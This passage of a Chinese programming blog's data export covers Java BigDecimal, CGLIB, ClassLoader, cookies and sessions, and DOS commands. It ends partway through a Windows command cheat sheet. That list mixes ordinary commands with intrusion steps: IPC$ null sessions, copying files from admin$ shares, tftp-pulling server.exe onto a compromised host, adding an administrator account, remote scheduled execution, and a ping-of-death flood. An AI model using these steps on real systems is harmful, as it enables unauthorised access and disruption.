class=\"number\">10.2</span>));</span><br><span class=\"line\">\tBigDecimal add2 = <span class=\"keyword\">new</span> BigDecimal(<span class=\"string\">\"10.1\"</span>).add(<span class=\"keyword\">new</span> BigDecimal(<span class=\"string\">\"10.2\"</span>));</span><br><span class=\"line\">\tBigDecimal add3 = BigDecimal.valueOf(num2).add(BigDecimal.valueOf(num3));</span><br><span class=\"line\">\tDouble add4 = num3 + num2;</span><br><span class=\"line\">\tSystem.out.println(add1 + <span class=\"string\">\"****\"</span> + add2 + <span class=\"string\">\"****\"</span> + add3 + <span class=\"string\">\"****\"</span> + add4);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>执行结果<br>20.3<strong><strong>20.3</strong></strong>20.300000381469727<em>**</em>20.300000381469726</p>\n<h3 id=\"得出结论\"><a href=\"#得出结论\" class=\"headerlink\" title=\"得出结论\"></a>得出结论</h3><pre><code>浮点型的运算会存在误差问题,所以我们需要进行小数精确运算的时候应该采用BigDecimal,BigDecimal实现了任意精度的浮点型运算,保证了运算的正确性\n</code></pre><h3 id=\"使用心得\"><a href=\"#使用心得\" class=\"headerlink\" title=\"使用心得\"></a>使用心得</h3><pre><code>我们在使用BigDecimal的时候应该采用构造方法的形式,传入字符串的形式进行加减乘除计算\n</code></pre><h3 id=\"API的使用\"><a href=\"#API的使用\" class=\"headerlink\" title=\"API的使用\"></a>API的使用</h3><pre><code>add(other) — 和\nsubtract(other) — 差\nmultiply(other) — 积\ndivid(other) — 商\nmod(oher) — 余\nint compareTo(other) — 比较两个数,如果相等返回0,如果小于other返回负数,如多大于other返回正数\nvalueOf(other) — 将基数值转换为大数据类型\n</code></pre>","site":{"data":{}},"excerpt":"","more":"<h3 id=\"大数据类型BigDecimal与Double\"><a href=\"#大数据类型BigDecimal与Double\" class=\"headerlink\" title=\"大数据类型BigDecimal与Double\"></a>大数据类型BigDecimal与Double</h3><pre><code>我们知道在浮点类型做运算的时候存在损失精度的问题,这是因为计算机底层是以二进制的方式存储数据的,所以我们在和金钱打交道的时候就应该避免采用Double,而应该用大数据类型BigDecimal.\nBigDecimal与Double的实验分别采用两种方式计算两个小数的加法运算:\n</code></pre><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">testNaN</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> num1 = <span class=\"number\">10</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">float</span> num2 = <span class=\"number\">10.1F</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">double</span> num3 = <span class=\"number\">10.2</span>;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tBigDecimal add1 = BigDecimal.valueOf(<span class=\"number\">10.1</span>).add(BigDecimal.valueOf(<span class=\"number\">10.2</span>));</span><br><span class=\"line\">\tBigDecimal add2 = <span class=\"keyword\">new</span> BigDecimal(<span class=\"string\">\"10.1\"</span>).add(<span class=\"keyword\">new</span> BigDecimal(<span class=\"string\">\"10.2\"</span>));</span><br><span class=\"line\">\tBigDecimal add3 = BigDecimal.valueOf(num2).add(BigDecimal.valueOf(num3));</span><br><span class=\"line\">\tDouble add4 = num3 + num2;</span><br><span class=\"line\">\tSystem.out.println(add1 + <span class=\"string\">\"****\"</span> + add2 + <span class=\"string\">\"****\"</span> + add3 + <span class=\"string\">\"****\"</span> + add4);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>执行结果<br>20.3<strong><strong>20.3</strong></strong>20.300000381469727<em>**</em>20.300000381469726</p>\n<h3 id=\"得出结论\"><a href=\"#得出结论\" class=\"headerlink\" title=\"得出结论\"></a>得出结论</h3><pre><code>浮点型的运算会存在误差问题,所以我们需要进行小数精确运算的时候应该采用BigDecimal,BigDecimal实现了任意精度的浮点型运算,保证了运算的正确性\n</code></pre><h3 id=\"使用心得\"><a href=\"#使用心得\" class=\"headerlink\" title=\"使用心得\"></a>使用心得</h3><pre><code>我们在使用BigDecimal的时候应该采用构造方法的形式,传入字符串的形式进行加减乘除计算\n</code></pre><h3 id=\"API的使用\"><a href=\"#API的使用\" class=\"headerlink\" title=\"API的使用\"></a>API的使用</h3><pre><code>add(other) — 和\nsubtract(other) — 差\nmultiply(other) — 积\ndivid(other) — 商\nmod(oher) — 余\nint compareTo(other) — 比较两个数,如果相等返回0,如果小于other返回负数,如多大于other返回正数\nvalueOf(other) — 将基数值转换为大数据类型\n</code></pre>"},{"title":"CGLIB动态代理","date":"2017-02-22T03:55:44.000Z","_content":"#### 实现原理\n&emsp;&emsp;Cglib是对类的代理,原始类无需实现接口,基本原理是在内存中产生一个继承了原始类的子类,然后由子类产生一个对象,底层是多台的原理。\n![JavaSE](CGLIB动态代理/1.png)\n#### 实现基本步骤\n1.在内存中产生一个类Class；\n2.设置其父类为被代理的类；\n3.采用回调方法进行回调。","source":"_posts/CGLIB动态代理.md","raw":"---\ntitle: CGLIB动态代理\ndate: 2017-02-22 11:55:44\ntags: JavaSE\n---\n#### 实现原理\n&emsp;&emsp;Cglib是对类的代理,原始类无需实现接口,基本原理是在内存中产生一个继承了原始类的子类,然后由子类产生一个对象,底层是多台的原理。\n![JavaSE](CGLIB动态代理/1.png)\n#### 实现基本步骤\n1.在内存中产生一个类Class；\n2.设置其父类为被代理的类；\n3.采用回调方法进行回调。","slug":"CGLIB动态代理","published":1,"updated":"2018-01-31T05:27:44.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjow44tvk0004mfahzn13c2qv","content":"<h4 id=\"实现原理\"><a href=\"#实现原理\" class=\"headerlink\" title=\"实现原理\"></a>实现原理</h4><p>&emsp;&emsp;Cglib是对类的代理,原始类无需实现接口,基本原理是在内存中产生一个继承了原始类的子类,然后由子类产生一个对象,底层是多台的原理。<br><img src=\"CGLIB动态代理/1.png\" alt=\"JavaSE\"></p>\n<h4 id=\"实现基本步骤\"><a href=\"#实现基本步骤\" class=\"headerlink\" title=\"实现基本步骤\"></a>实现基本步骤</h4><p>1.在内存中产生一个类Class；<br>2.设置其父类为被代理的类；<br>3.采用回调方法进行回调。</p>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"实现原理\"><a href=\"#实现原理\" class=\"headerlink\" title=\"实现原理\"></a>实现原理</h4><p>&emsp;&emsp;Cglib是对类的代理,原始类无需实现接口,基本原理是在内存中产生一个继承了原始类的子类,然后由子类产生一个对象,底层是多台的原理。<br><img src=\"CGLIB动态代理/1.png\" alt=\"JavaSE\"></p>\n<h4 id=\"实现基本步骤\"><a href=\"#实现基本步骤\" class=\"headerlink\" title=\"实现基本步骤\"></a>实现基本步骤</h4><p>1.在内存中产生一个类Class；<br>2.设置其父类为被代理的类；<br>3.采用回调方法进行回调。</p>\n"},{"title":"ClassLoader类加载器","date":"2016-12-01T06:54:14.000Z","_content":"\n**类加载器的作用:**\n          类加载器的作用是加载类文件(.class)到内存中去,我们常见的ClassLoader承担的就是这个责任\n\n**类加载器的理解**\n          类加载器也是一个类,只不过它的功能是加载其他的类的字节码进入内存中\n\n** 类加载器的层次结构 **\n          类加载器分为了三层结构,层次结构如下:\n           Bootstrap Loader  - 负责加载系统类 \n            | \n               - - ExtClassLoader  - 负责加载扩展类 \n                          | \n                           - - AppClassLoader  - 负责加载应用类 \n\n**为什么要这么设计**\n\n- 为了分工,各自负责各自的模块\n- 利用了委托机制\n\n**什么是委托机制**\n          对于类加载器来说,委托机制就是当加载字节码对象时,每个类加载器先请求parent加载父类负责的字节码,当父类加载时,又去请求其父类的父类的加载器去加载,只有当父类加载完自己的字节码时,\n          子类才开始加载自己负责的类字节码","source":"_posts/ClassLoader类加载器.md","raw":"---\ntitle: ClassLoader类加载器\ndate: 2016-11-31 14:54:14\ntags: JavaSE\n---\n\n**类加载器的作用:**\n          类加载器的作用是加载类文件(.class)到内存中去,我们常见的ClassLoader承担的就是这个责任\n\n**类加载器的理解**\n          类加载器也是一个类,只不过它的功能是加载其他的类的字节码进入内存中\n\n** 类加载器的层次结构 **\n          类加载器分为了三层结构,层次结构如下:\n           Bootstrap Loader  - 负责加载系统类 \n            | \n               - - ExtClassLoader  - 负责加载扩展类 \n                          | \n                           - - AppClassLoader  - 负责加载应用类 \n\n**为什么要这么设计**\n\n- 为了分工,各自负责各自的模块\n- 利用了委托机制\n\n**什么是委托机制**\n          对于类加载器来说,委托机制就是当加载字节码对象时,每个类加载器先请求parent加载父类负责的字节码,当父类加载时,又去请求其父类的父类的加载器去加载,只有当父类加载完自己的字节码时,\n          子类才开始加载自己负责的类字节码","slug":"ClassLoader类加载器","published":1,"updated":"2018-01-31T06:56:16.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjow44tvl0005mfahgdsqc89h","content":"<p><strong>类加载器的作用:</strong><br>          类加载器的作用是加载类文件(.class)到内存中去,我们常见的ClassLoader承担的就是这个责任</p>\n<p><strong>类加载器的理解</strong><br>          类加载器也是一个类,只不过它的功能是加载其他的类的字节码进入内存中</p>\n<p><strong> 类加载器的层次结构 </strong><br>          类加载器分为了三层结构,层次结构如下:<br>           Bootstrap Loader  - 负责加载系统类<br>            | </p>\n<pre><code>- - ExtClassLoader  - 负责加载扩展类 \n           | \n            - - AppClassLoader  - 负责加载应用类 \n</code></pre><p><strong>为什么要这么设计</strong></p>\n<ul>\n<li>为了分工,各自负责各自的模块</li>\n<li>利用了委托机制</li>\n</ul>\n<p><strong>什么是委托机制</strong><br>          对于类加载器来说,委托机制就是当加载字节码对象时,每个类加载器先请求parent加载父类负责的字节码,当父类加载时,又去请求其父类的父类的加载器去加载,只有当父类加载完自己的字节码时,<br>          子类才开始加载自己负责的类字节码</p>\n","site":{"data":{}},"excerpt":"","more":"<p><strong>类加载器的作用:</strong><br>          类加载器的作用是加载类文件(.class)到内存中去,我们常见的ClassLoader承担的就是这个责任</p>\n<p><strong>类加载器的理解</strong><br>          类加载器也是一个类,只不过它的功能是加载其他的类的字节码进入内存中</p>\n<p><strong> 类加载器的层次结构 </strong><br>          类加载器分为了三层结构,层次结构如下:<br>           Bootstrap Loader  - 负责加载系统类<br>            | </p>\n<pre><code>- - ExtClassLoader  - 负责加载扩展类 \n           | \n            - - AppClassLoader  - 负责加载应用类 \n</code></pre><p><strong>为什么要这么设计</strong></p>\n<ul>\n<li>为了分工,各自负责各自的模块</li>\n<li>利用了委托机制</li>\n</ul>\n<p><strong>什么是委托机制</strong><br>          对于类加载器来说,委托机制就是当加载字节码对象时,每个类加载器先请求parent加载父类负责的字节码,当父类加载时,又去请求其父类的父类的加载器去加载,只有当父类加载完自己的字节码时,<br>          子类才开始加载自己负责的类字节码</p>\n"},{"title":"Cookie和Session","date":"2014-11-01T16:56:12.000Z","_content":"\n### 什么是Cookie,Cookie有什么规范\n\n\tCookie是客户端绘画技术,说白了就是将客户数据保存在和客户端(浏览器上).Cookie是由服务器创建的,通过response响应,发送给客户端一个键值对进行保存,当客户端再次请求的时候会携带这个Cookie(HTTP请求行中)到服务器,这样服务器就可以识别客户端了.\n\n\n### HTTPCookie的规范如下:\n\n\tCookie的上限为4kb,一个服务器最多在客户端浏览器上保存20个Cookie,一个浏览器最多保存300个Cookie\n\n\n### Session的理解\n\t\n\tSession是服务器端的绘画技术,当我们第一次访问JSP或者Servlet动态资源的时候服务器会调用getSession()获取Session对象,访问HTML一些静态资源的时候是不会创建Session对象的.\n\n### Session的失效:\n\n\t1.服务器会把长时间没有活动的Session移除掉,此时Session失效\n\t2.我们手动的调用invalidate()方法使得Session失效\n\n### Session的作用域问题:\n\n![](https://i.imgur.com/IfQVHGt.png)\n\n### 当Cookie被禁用时如何处理Session问题\n\n![](https://i.imgur.com/FPo25cE.png)","source":"_posts/Cookie和Session.md","raw":"---\ntitle: Cookie和Session\ndate: 2014-11-2 00:56:12\ntags: javaWEB\n---\n\n### 什么是Cookie,Cookie有什么规范\n\n\tCookie是客户端绘画技术,说白了就是将客户数据保存在和客户端(浏览器上).Cookie是由服务器创建的,通过response响应,发送给客户端一个键值对进行保存,当客户端再次请求的时候会携带这个Cookie(HTTP请求行中)到服务器,这样服务器就可以识别客户端了.\n\n\n### HTTPCookie的规范如下:\n\n\tCookie的上限为4kb,一个服务器最多在客户端浏览器上保存20个Cookie,一个浏览器最多保存300个Cookie\n\n\n### Session的理解\n\t\n\tSession是服务器端的绘画技术,当我们第一次访问JSP或者Servlet动态资源的时候服务器会调用getSession()获取Session对象,访问HTML一些静态资源的时候是不会创建Session对象的.\n\n### Session的失效:\n\n\t1.服务器会把长时间没有活动的Session移除掉,此时Session失效\n\t2.我们手动的调用invalidate()方法使得Session失效\n\n### Session的作用域问题:\n\n![](https://i.imgur.com/IfQVHGt.png)\n\n### 当Cookie被禁用时如何处理Session问题\n\n![](https://i.imgur.com/FPo25cE.png)","slug":"Cookie和Session","published":1,"updated":"2017-12-29T15:28:50.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjow44tvn0008mfahzky5xltn","content":"<h3 id=\"什么是Cookie-Cookie有什么规范\"><a href=\"#什么是Cookie-Cookie有什么规范\" class=\"headerlink\" title=\"什么是Cookie,Cookie有什么规范\"></a>什么是Cookie,Cookie有什么规范</h3><pre><code>Cookie是客户端绘画技术,说白了就是将客户数据保存在和客户端(浏览器上).Cookie是由服务器创建的,通过response响应,发送给客户端一个键值对进行保存,当客户端再次请求的时候会携带这个Cookie(HTTP请求行中)到服务器,这样服务器就可以识别客户端了.\n</code></pre><h3 id=\"HTTPCookie的规范如下\"><a href=\"#HTTPCookie的规范如下\" class=\"headerlink\" title=\"HTTPCookie的规范如下:\"></a>HTTPCookie的规范如下:</h3><pre><code>Cookie的上限为4kb,一个服务器最多在客户端浏览器上保存20个Cookie,一个浏览器最多保存300个Cookie\n</code></pre><h3 id=\"Session的理解\"><a href=\"#Session的理解\" class=\"headerlink\" title=\"Session的理解\"></a>Session的理解</h3><pre><code>Session是服务器端的绘画技术,当我们第一次访问JSP或者Servlet动态资源的时候服务器会调用getSession()获取Session对象,访问HTML一些静态资源的时候是不会创建Session对象的.\n</code></pre><h3 id=\"Session的失效\"><a href=\"#Session的失效\" class=\"headerlink\" title=\"Session的失效:\"></a>Session的失效:</h3><pre><code>1.服务器会把长时间没有活动的Session移除掉,此时Session失效\n2.我们手动的调用invalidate()方法使得Session失效\n</code></pre><h3 id=\"Session的作用域问题\"><a href=\"#Session的作用域问题\" class=\"headerlink\" title=\"Session的作用域问题:\"></a>Session的作用域问题:</h3><p><img src=\"https://i.imgur.com/IfQVHGt.png\" alt=\"\"></p>\n<h3 id=\"当Cookie被禁用时如何处理Session问题\"><a href=\"#当Cookie被禁用时如何处理Session问题\" class=\"headerlink\" title=\"当Cookie被禁用时如何处理Session问题\"></a>当Cookie被禁用时如何处理Session问题</h3><p><img src=\"https://i.imgur.com/FPo25cE.png\" alt=\"\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"什么是Cookie-Cookie有什么规范\"><a href=\"#什么是Cookie-Cookie有什么规范\" class=\"headerlink\" title=\"什么是Cookie,Cookie有什么规范\"></a>什么是Cookie,Cookie有什么规范</h3><pre><code>Cookie是客户端绘画技术,说白了就是将客户数据保存在和客户端(浏览器上).Cookie是由服务器创建的,通过response响应,发送给客户端一个键值对进行保存,当客户端再次请求的时候会携带这个Cookie(HTTP请求行中)到服务器,这样服务器就可以识别客户端了.\n</code></pre><h3 id=\"HTTPCookie的规范如下\"><a href=\"#HTTPCookie的规范如下\" class=\"headerlink\" title=\"HTTPCookie的规范如下:\"></a>HTTPCookie的规范如下:</h3><pre><code>Cookie的上限为4kb,一个服务器最多在客户端浏览器上保存20个Cookie,一个浏览器最多保存300个Cookie\n</code></pre><h3 id=\"Session的理解\"><a href=\"#Session的理解\" class=\"headerlink\" title=\"Session的理解\"></a>Session的理解</h3><pre><code>Session是服务器端的绘画技术,当我们第一次访问JSP或者Servlet动态资源的时候服务器会调用getSession()获取Session对象,访问HTML一些静态资源的时候是不会创建Session对象的.\n</code></pre><h3 id=\"Session的失效\"><a href=\"#Session的失效\" class=\"headerlink\" title=\"Session的失效:\"></a>Session的失效:</h3><pre><code>1.服务器会把长时间没有活动的Session移除掉,此时Session失效\n2.我们手动的调用invalidate()方法使得Session失效\n</code></pre><h3 id=\"Session的作用域问题\"><a href=\"#Session的作用域问题\" class=\"headerlink\" title=\"Session的作用域问题:\"></a>Session的作用域问题:</h3><p><img src=\"https://i.imgur.com/IfQVHGt.png\" alt=\"\"></p>\n<h3 id=\"当Cookie被禁用时如何处理Session问题\"><a href=\"#当Cookie被禁用时如何处理Session问题\" class=\"headerlink\" title=\"当Cookie被禁用时如何处理Session问题\"></a>当Cookie被禁用时如何处理Session问题</h3><p><img src=\"https://i.imgur.com/FPo25cE.png\" alt=\"\"></p>\n"},{"title":"DOS批处理入门","date":"2017-12-29T07:42:51.000Z","_content":"\n### echo命令\n\techo hello: 向控制台输出hello\n\techo hello > file.txt: 将hello输出到文件file.txt中\n\techo world >> file.txt: 将world追加到文件file.txt中\n\n### md命令\n\tmd file1, file2, file3 ... 在当前路径下创建多个文件夹\n\n### dir命令\n\tdir /b: 显示当前路径下所有文件及文件夹名\n\tdir /s: 显示当前路径下的所有文件及子文件\n\n### > 和 >>\n\techo hello > file1.txt: 将hello写入到文件中并覆盖原来的内容\n\techo world >> file.txt: 将world追加到文件file.txt中\n### type命令\n\tfilename.ext: 查下看文件中的内容\n### [通配符](https://baike.baidu.com/item/%E9%80%9A%E9%85%8D%E7%AC%A6/92991?fr=aladdin) * 和 ?\n\t\n\t*: 匹配所有的内容\n\t?: 仅代表单个字\n\tdir /b /s > file.txt: 将文件及文件夹的名称信息输出到file文件中\n\t\n### ren = rename命令\n\tren old.txt new.txt： 重命名文件","source":"_posts/DOS批处理入门.md","raw":"---\ntitle: DOS批处理入门\ndate: 2017-12-29 15:42:51\ntags: WINDOWS\n---\n\n### echo命令\n\techo hello: 向控制台输出hello\n\techo hello > file.txt: 将hello输出到文件file.txt中\n\techo world >> file.txt: 将world追加到文件file.txt中\n\n### md命令\n\tmd file1, file2, file3 ... 在当前路径下创建多个文件夹\n\n### dir命令\n\tdir /b: 显示当前路径下所有文件及文件夹名\n\tdir /s: 显示当前路径下的所有文件及子文件\n\n### > 和 >>\n\techo hello > file1.txt: 将hello写入到文件中并覆盖原来的内容\n\techo world >> file.txt: 将world追加到文件file.txt中\n### type命令\n\tfilename.ext: 查下看文件中的内容\n### [通配符](https://baike.baidu.com/item/%E9%80%9A%E9%85%8D%E7%AC%A6/92991?fr=aladdin) * 和 ?\n\t\n\t*: 匹配所有的内容\n\t?: 仅代表单个字\n\tdir /b /s > file.txt: 将文件及文件夹的名称信息输出到file文件中\n\t\n### ren = rename命令\n\tren old.txt new.txt： 重命名文件","slug":"DOS批处理入门","published":1,"updated":"2017-12-29T17:23:44.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjow44tvo0009mfah6ebl6jbh","content":"<h3 id=\"echo命令\"><a href=\"#echo命令\" class=\"headerlink\" title=\"echo命令\"></a>echo命令</h3><pre><code>echo hello: 向控制台输出hello\necho hello &gt; file.txt: 将hello输出到文件file.txt中\necho world &gt;&gt; file.txt: 将world追加到文件file.txt中\n</code></pre><h3 id=\"md命令\"><a href=\"#md命令\" class=\"headerlink\" title=\"md命令\"></a>md命令</h3><pre><code>md file1, file2, file3 ... 在当前路径下创建多个文件夹\n</code></pre><h3 id=\"dir命令\"><a href=\"#dir命令\" class=\"headerlink\" title=\"dir命令\"></a>dir命令</h3><pre><code>dir /b: 显示当前路径下所有文件及文件夹名\ndir /s: 显示当前路径下的所有文件及子文件\n</code></pre><h3 id=\"gt-和-gt-gt\"><a href=\"#gt-和-gt-gt\" class=\"headerlink\" title=\"&gt; 和 &gt;&gt;\"></a>&gt; 和 &gt;&gt;</h3><pre><code>echo hello &gt; file1.txt: 将hello写入到文件中并覆盖原来的内容\necho world &gt;&gt; file.txt: 将world追加到文件file.txt中\n</code></pre><h3 id=\"type命令\"><a href=\"#type命令\" class=\"headerlink\" title=\"type命令\"></a>type命令</h3><pre><code>filename.ext: 查下看文件中的内容\n</code></pre><h3 id=\"通配符-和\"><a href=\"#通配符-和\" class=\"headerlink\" title=\"通配符 * 和 ?\"></a><a href=\"https://baike.baidu.com/item/%E9%80%9A%E9%85%8D%E7%AC%A6/92991?fr=aladdin\" target=\"_blank\" rel=\"noopener\">通配符</a> * 和 ?</h3><pre><code>*: 匹配所有的内容\n?: 仅代表单个字\ndir /b /s &gt; file.txt: 将文件及文件夹的名称信息输出到file文件中\n</code></pre><h3 id=\"ren-rename命令\"><a href=\"#ren-rename命令\" class=\"headerlink\" title=\"ren = rename命令\"></a>ren = rename命令</h3><pre><code>ren old.txt new.txt： 重命名文件\n</code></pre>","site":{"data":{}},"excerpt":"","more":"<h3 id=\"echo命令\"><a href=\"#echo命令\" class=\"headerlink\" title=\"echo命令\"></a>echo命令</h3><pre><code>echo hello: 向控制台输出hello\necho hello &gt; file.txt: 将hello输出到文件file.txt中\necho world &gt;&gt; file.txt: 将world追加到文件file.txt中\n</code></pre><h3 id=\"md命令\"><a href=\"#md命令\" class=\"headerlink\" title=\"md命令\"></a>md命令</h3><pre><code>md file1, file2, file3 ... 在当前路径下创建多个文件夹\n</code></pre><h3 id=\"dir命令\"><a href=\"#dir命令\" class=\"headerlink\" title=\"dir命令\"></a>dir命令</h3><pre><code>dir /b: 显示当前路径下所有文件及文件夹名\ndir /s: 显示当前路径下的所有文件及子文件\n</code></pre><h3 id=\"gt-和-gt-gt\"><a href=\"#gt-和-gt-gt\" class=\"headerlink\" title=\"&gt; 和 &gt;&gt;\"></a>&gt; 和 &gt;&gt;</h3><pre><code>echo hello &gt; file1.txt: 将hello写入到文件中并覆盖原来的内容\necho world &gt;&gt; file.txt: 将world追加到文件file.txt中\n</code></pre><h3 id=\"type命令\"><a href=\"#type命令\" class=\"headerlink\" title=\"type命令\"></a>type命令</h3><pre><code>filename.ext: 查下看文件中的内容\n</code></pre><h3 id=\"通配符-和\"><a href=\"#通配符-和\" class=\"headerlink\" title=\"通配符 * 和 ?\"></a><a href=\"https://baike.baidu.com/item/%E9%80%9A%E9%85%8D%E7%AC%A6/92991?fr=aladdin\" target=\"_blank\" rel=\"noopener\">通配符</a> * 和 ?</h3><pre><code>*: 匹配所有的内容\n?: 仅代表单个字\ndir /b /s &gt; file.txt: 将文件及文件夹的名称信息输出到file文件中\n</code></pre><h3 id=\"ren-rename命令\"><a href=\"#ren-rename命令\" class=\"headerlink\" title=\"ren = rename命令\"></a>ren = rename命令</h3><pre><code>ren old.txt new.txt： 重命名文件\n</code></pre>"},{"title":"Windows下DOS命令大全(经典收藏)","date":"2017-12-29T05:34:42.000Z","_content":"\n**copy:** \\\\ip\\admin$\\svv.exe c:\\ 或:copy\\\\ip\\admin$\\*.* 复制对方admini$共享下的srv.exe文件（所有文件）至本地C： \n\n**xcopy** 要复制的文件或目录树　目标地址\\目录名 复制文件和目录树，用参数/Y将不提示覆盖相同文件 \n\n**tftp -i** 自己IP(用肉机作跳板时这用肉机IP) get server.exe c:\\server.exe 登陆后，将\"IP\"的server.exe下载到目标主机c:\\server.exe 参数：-i指以二进制模式传送，如传送exe文件时用，如不加-i 则以ASCII模式（传送文本文件模式）进行传送\n \n**tftp -i** 对方IP　put c:\\server.exe 登陆后，上传本地c:\\server.exe至主机 \n**ftp ip** 端口 用于上传文件至服务器或进行文件操作，默认端口为21。bin指用二进制方式传送（可执行文件进）；\n默认为ASCII格式传送(文本文件时) \n**route print **显示出IP路由，将主要显示网络地址Network addres，子网掩码Netmask，网关地址Gateway addres，接口地址Interface \n**arp** 查看和处理ARP缓存，ARP是名字解析的意思，负责把一个IP解析成一个物理性的MAC地址。arp -a将显示出全部信息 \n**start **程序名或命令 /max 或/min 新开一个新窗口并最大化（最小化）运行某程序或命令 \n**mem **查看cpu使用情况 \n**attrib **文件名(目录名) 查看某文件（目录）的属性 \n**attrib** 文件名 -A -R -S -H 或 +A +R +S +H 去掉(添加)某文件的 存档，只读，系统，隐藏 属性；用＋则是添加为某属性 \n**dir **查看文件，参数：/Q显示文件及目录属系统哪个用户，/T:C显示文件创建时间，/T:A显示文件上次被访问时间，/T:W上次被修改时间 \n**date /t 、 time /t **使用此参数即\"DATE/T\"、\"TIME/T\"将只显示当前日期和时间，而不必输入新日期和时间 \n**set** 指定环境变量名称=要指派给变量的字符 设置环境变量 \nset 显示当前所有的环境变量 \nset p(或其它字符) 显示出当前以字符p(或其它字符)开头的所有环境变量 \npause 暂停批处理程序，并显示出：请按任意键继续.... \nif 在批处理程序中执行条件处理（更多说明见if命令及变量） \ngoto 标签 将cmd.exe导向到批处理程序中带标签的行（标签必须单独一行，且以冒号打头，例如：\"：start\"标签） \ncall 路径\\批处理文件名 从批处理程序中调用另一个批处理程序 （更多说明见call /?） \nfor 对一组文件中的每一个文件执行某个特定命令（更多说明见for命令及变量） \necho on或off 打开或关闭echo，仅用echo不加参数则显示当前echo设置 \necho 信息 在屏幕上显示出信息 \necho 信息 >> pass.txt 将\"信息\"保存到pass.txt文件中 \nfindstr \"Hello\" aa.txt 在aa.txt文件中寻找字符串hello \nfind 文件名 查找某文件 \ntitle 标题名字 更改CMD窗口标题名字 \ncolor 颜色值 设置cmd控制台前景和背景颜色；0＝黑、1＝蓝、2＝绿、3＝浅绿、4＝红、5＝紫、6＝黄、7=白、8=灰、9=淡蓝、A＝淡绿、B=淡浅绿、C=淡红、D=淡紫、E=淡黄、F=亮白 \nprompt 名称 更改cmd.exe的显示的命令提示符(把C:\\、D:\\统一改为：EntSky\\ )\nnet use \\\\ip\\ipc$ \" \" /user:\" \" 建立IPC空链接 \nnet use \\\\ip\\ipc$ \"密码\" /user:\"用户名\" 建立IPC非空链接 \nnet use h: \\\\ip\\c$ \"密码\" /user:\"用户名\" 直接登陆后映射对方C：到本地为H: \nnet use h: \\\\ip\\c$ 登陆后映射对方C：到本地为H: \nnet use \\\\ip\\ipc$ /del 删除IPC链接 \nnet use h: /del 删除映射对方到本地的为H:的映射 \nnet user 用户名　密码　/add 建立用户 \nnet user guest /active:yes 激活guest用户 \nnet user 查看有哪些用户 \nnet user 帐户名 查看帐户的属性 \nnet localgroup administrators 用户名 /add 把\"用户\"添加到管理员中使其具有管理员权限,注意：administrator后加s用复数 \nnet start 查看开启了哪些服务 \nnet start 服务名　 开启服务；(如:net start telnet， net start schedule) \nnet stop 服务名 停止某服务 \nnet time \\\\目标ip 查看对方时间 \nnet time \\\\目标ip /set 设置本地计算机时间与\"目标IP\"主机的时间同步,加上参数/yes可取消确认信息 \nnet view 查看本地局域网内开启了哪些共享 \nnet view \\\\ip 查看对方局域网内开启了哪些共享 \nnet config 显示系统网络设置 \nnet logoff 断开连接的共享 \nnet pause 服务名 暂停某服务 \nnet send ip \"文本信息\" 向对方发信息 \nnet ver 局域网内正在使用的网络连接类型和信息 \nnet share 查看本地开启的共享 \nnet share ipc$ 开启ipc$共享 \nnet share ipc$ /del 删除ipc$共享 \nnet share c$ /del 删除C：共享 \nnet user guest 12345 用guest用户登陆后用将密码改为12345 \nnet password 密码 更改系统登陆密码 \nnetstat -a 查看开启了哪些端口,常用netstat -an \nnetstat -n 查看端口的网络连接情况，常用netstat -an \nnetstat -v 查看正在进行的工作 \nnetstat -p 协议名 例：netstat -p tcq/ip 查看某协议使用情况（查看tcp/ip协议使用情况） \nnetstat -s 查看正在使用的所有协议使用情况 \nnbtstat -A ip 对方136到139其中一个端口开了的话，就可查看对方最近登陆的用户名（03前的为用户名）-注意：参数-A要大写 \ntracert -参数 ip(或计算机名) 跟踪路由（数据包），参数：\"-w数字\"用于设置超时间隔。 \nping -t -l 65550 ip 死亡之ping(发送大于64K的文件并一直ping就成了死亡之ping) \nipconfig (winipcfg) 用于windows NT及XP(windows 95 98)查看本地ip地址，ipconfig可用参数\"/all\"显示全部配置信息 \ntlist -t 以树行列表显示进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内) \nkill -F 进程名 加-F参数后强制结束某进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内) \ndel -F 文件名 加-F参数后就可删除只读文件,/AR、/AH、/AS、/AA分别表示删除只读、隐藏、系统、存档文件，/A-R、/A-H、/A-S、/A-A表示删除除只读、隐藏、系统、存档以外的文件。例如\"DEL/AR *.*\"表示删除当前目录下所有只读文件，\"DEL/A-S *.*\"表示删除当前目录下除系统文件以外的所有文件\n#2 二：\ndel /S /Q 目录 或用：rmdir /s /Q 目录 /S删除目录及目录下的所有子目录和文件。同时使用参数/Q 可取消删除操作时的系统确认就直接删除。（二个命令作用相同） \nmove 盘符\\路径\\要移动的文件名　存放移动文件的路径\\移动后文件名 移动文件,用参数/y将取消确认移动目录存在相同文件的提示就直接覆盖 \nfc one.txt two.txt > 3st.txt 对比二个文件并把不同之处输出到3st.txt文件中，\"> \"和\"> >\" 是重定向命令 \nat id号 开启已注册的某个计划任务 \nat /delete 停止所有计划任务，用参数/yes则不需要确认就直接停止 \nat id号 /delete 停止某个已注册的计划任务 \nat 查看所有的计划任务 \nat \\\\ip time 程序名(或一个命令) /r 在某时间运行对方某程序并重新启动计算机 \nfinger username @host 查看最近有哪些用户登陆 \ntelnet ip 端口 